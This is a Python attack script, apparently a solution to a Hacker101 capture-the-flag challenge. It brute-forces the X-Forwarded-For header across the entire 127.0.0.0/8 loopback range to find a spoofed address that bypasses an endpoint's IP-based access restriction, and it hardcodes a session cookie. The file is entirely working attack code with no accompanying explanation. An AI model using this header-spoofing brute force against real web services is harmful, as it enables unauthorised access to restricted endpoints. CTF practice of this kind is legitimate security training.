#!/usr/bin/env python3
import requests
from tqdm import tqdm
import ipaddress

url = 'https://06642b6f1ecb637de0b6215d28220e51.ctf.hacker101.com/r3c0n_server_4fdk59/api/cgi-bin/'
cookies = {'signuptoken': 'ec4e4c27d7b9682d7b0292f69e7e0146'}
headers = {'X-Forwarded-For': ''}
standard_answer = "This endpoint cannot be visited from this IP address"
start_ip = ipaddress.IPv4Address("127.0.0.0")
end_ip = ipaddress.IPv4Address("127.255.255.255")

def xff_bf():
    for ip_int in tqdm(range(int(start_ip), int(end_ip))):
        ip_address = ipaddress.IPv4Address(ip_int)
        headers["X-Forwarded-For"] = str(ip_address)
        r = requests.get(url, cookies=cookies, headers=headers)

        # print("headers: ", headers)
        # print("ip: ", str(ip_address), "| rtext: ", r.text)

        if not standard_answer in r.text:
            return ip_address
    return None

ip_address = xff_bf()
if ip_address:
    print(f"[*] Found ip address to access this endpoint with XFF: {ip_address}")
else:
    print(f"[!] Couldn't find ip address to access this endpoint with XFF")